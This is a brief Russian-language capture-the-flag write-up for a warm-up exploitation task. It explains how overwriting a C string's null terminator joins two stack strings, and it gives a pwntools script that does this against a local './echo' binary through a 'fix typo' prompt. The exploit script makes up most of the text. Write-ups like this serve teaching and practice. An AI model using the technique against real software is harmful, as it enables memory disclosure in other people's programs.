# Solution
Задачка на разминку. Из-за того, что в C конец строки обозначается нулевым байтом. 
Мы можем сконкатинировать две строки на стеке, если перетрём нулевой байт.

```py
from pwn import *

p = process("./echo")

p.sendlineafter(b"What's your name?\n", "A"*0x3f)
p.sendlineafter(b"Do you want to fix typo? (y/n)\n", b"y")
p.sendlineafter(b"enter index of letter to fix:\n", b"63")
p.sendlineafter(b"enter correct letter:\n", b"\n")

p.interactive()
```